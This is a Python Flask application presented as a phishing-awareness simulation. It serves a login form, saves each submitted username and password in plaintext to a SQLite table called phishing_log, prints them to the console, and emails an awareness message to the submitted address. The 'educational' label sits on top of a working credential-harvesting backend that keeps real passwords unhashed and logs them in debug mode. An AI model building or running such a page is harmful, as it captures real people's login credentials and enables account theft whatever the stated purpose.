from flask import Flask, render_template, request
import smtplib
import sqlite3
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)

# Database initialization
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS phishing_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT
        )
    ''')
    conn.commit()
    conn.close()

# Educational email function
def send_educational_email(email):
    sender_email = os.getenv('EMAIL_USER')  # Email address from environment variable
    sender_password = os.getenv('EMAIL_PASS')  # App password from environment variable
    subject = "Phishing Awareness: Stay Safe!"
    body = """
    Dear User,

    You recently interacted with a simulated phishing page created for educational purposes.
    Here are some tips to protect yourself:
    - Verify the website URL before entering credentials.
    - Be cautious of urgent or alarming messages.
    - Never share sensitive information via email.

    Stay safe!
    - Security Team
    """
    # Construct email
    message = f"Subject: {subject}\n\n{body}" 
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, email, message) 
        print("Educational email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get("username")  # Collect the submitted username
        password = request.form.get("password")  # Collect the submitted password

        # Added logging for debugging
        print(f"Received credentials - Username: {username}, Password: {password}")

        # Log credentials to database
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute("INSERT INTO phishing_log (username, password) VALUES (?, ?)", (username, password))
        conn.commit()
        conn.close()

        # Send educational email
        send_educational_email(username)

        # Redirect to "hacked" page
        return render_template("hacked.html")
    return render_template('index.html')  

if __name__ == "__main__":
    # Initialize the database on app start
    init_db()
    app.run(debug=True)

